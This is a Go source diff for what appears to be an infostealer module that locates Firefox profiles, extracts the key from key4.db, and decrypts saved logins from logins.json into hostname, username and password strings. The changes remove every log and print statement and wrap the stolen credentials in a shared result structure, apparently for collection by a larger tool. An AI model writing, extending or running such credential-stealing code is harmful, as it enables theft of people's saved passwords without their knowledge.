@@ -300,8 +300,7 @@ func getMozillaKey(profilePath string, app string) []byte{
 	if app == "FF" { // Firefox
 		db, err := sql.Open("sqlite3", profilePath+"\\key4.db")
 		if err!=nil{
-			log.Println("DB not found")
-			return []byte{0}
+			return nil
 		}
 		rows, err := db.Query("SELECT item1, item2 FROM metadata WHERE id = 'password'")
 		var item1, item2 string
@@ -317,10 +316,7 @@ func getMozillaKey(profilePath string, app string) []byte{
 				rows2.Scan(&all, &a102)
 
 				var sourceData AsnSourceDataMasterPassword
-				var _, err1 = asn1.Unmarshal([]byte(all), &sourceData)
-				if err1!=nil{
-					log.Println(err1.Error())
-				}
+				asn1.Unmarshal([]byte(all), &sourceData)
 
 				var entrySalt = sourceData.Data.Data.Entry
 				var cipherT = sourceData.EncryptedPasswdCheck
@@ -334,7 +330,7 @@ func getMozillaKey(profilePath string, app string) []byte{
 		var key = mozillaExtractSecretKey(key_data, globalSalt, "")
 		return key
 	}
-	return []byte{0}
+	return nil
 }
 
 func getFirefoxProfiles(path string) []string{
@@ -356,10 +352,7 @@ func getFirefoxProfiles(path string) []string{
 func mozillaDecodeLoginData(data string) decodedLogindata {
 	var nudeData, _ = base64.StdEncoding.DecodeString(data)
 	var sourceData AsnLoginData
-	var _, errUnmarshal = asn1.Unmarshal(nudeData, &sourceData)
-	if errUnmarshal!=nil{
-		log.Print("Error -", errUnmarshal.Error())
-	}
+	asn1.Unmarshal(nudeData, &sourceData)
 	var returned = decodedLogindata{sourceData.KeyId, sourceData.SomeInfo.Lv, sourceData.CipherText}
 
 	return returned
@@ -368,11 +361,11 @@ func mozillaDecodeLoginData(data string) decodedLogindata {
 func mozillaGetLoginData(profile string) []mozillaLoginData {
 	_, err := sql.Open("sqlite3",profile+"\\signons.sqlite")
 	if err != nil{
-		log.Println("You need to use json")
+		return nil
 	}
 	var file, errFile = ioutil.ReadFile(profile+"\\logins.json")
 	if errFile!=nil{
-		fmt.Print("Json not exist")
+		return nil
 	}
 
 	var logins MozillaLogins
@@ -389,11 +382,10 @@ func mozillaGetLoginData(profile string) []mozillaLoginData {
 	return LoginsList
 }
 
-func mozillaModuleStart(data AppInfo) {
+func mozillaModuleStart(data AppInfo) ([]string, bool){
 	if _, err := os.Stat(data.path); err == nil {
 		var profiles= getFirefoxProfiles(data.path)
 		for i := range profiles {
-			log.Println("Profile path found - ", profiles[i])
 			var(
 				key = getMozillaKey(profiles[i], data.name)
 				credentials = mozillaGetLoginData(profiles[i])
@@ -402,13 +394,17 @@ func mozillaModuleStart(data AppInfo) {
 				key = key[:24]
 			}
 
+			if len(credentials) == 0 || len(key)==0 || key == nil{
+				return nil, false
+			}
+			var data []string
 			for j := range credentials{
 				var (
 					loginWithTrash    = tripleDesDecrypt(credentials[j].userName.cipherText, key, credentials[j].userName.Iv)
 					passwordWithTrash = tripleDesDecrypt(credentials[j].passWord.cipherText, key, credentials[j].passWord.Iv)
 				)
-				if len(loginWithTrash) == 0{
-					return
+				if len(loginWithTrash) == 0 || len(passwordWithTrash) == 0{
+					continue
 				}
 				var(
 					loginLength = len(loginWithTrash)
@@ -416,16 +412,30 @@ func mozillaModuleStart(data AppInfo) {
 					login = loginWithTrash[:loginLength-int(loginWithTrash[loginLength-1])]
 					password = passwordWithTrash[:passwordLength-int(passwordWithTrash[passwordLength-1])]
 				)
-				log.Printf("%s %s %s\n", credentials[j].hostname, login, password)
+				data = append(data, fmt.Sprintf("%s %s %s", credentials[j].hostname, login, password))
+			}
+			return data, true
+		}
+	}
+	return nil, false
+}
+
+func MozillaExtractDataRun() common.ExtractDataResult{
+	var Result common.ExtractDataResult
+	var EmptyResult = common.ExtractDataResult{false,Result.Data}
+
+	for i:=range mozillaPathsUserData {
+		if _, err := os.Stat(mozillaPathsUserData[i].path); err == nil {
+			var data, success = mozillaModuleStart(mozillaPathsUserData[i])
+			if success{
+				Result.Data = append(Result.Data, data...)
 			}
 		}
 	}
-}
-
-func MozillaExtractDataRun(){
-	for i:=range mozillaPathsUserData {
-		if _, err := os.Stat(mozillaPathsUserData[i].path); err == nil {
-			mozillaModuleStart(mozillaPathsUserData[i])
-		}
+	if len(Result.Data) == 0{
+		return EmptyResult
+	} else {
+		Result.Success = true
+		return Result
 	}
 }
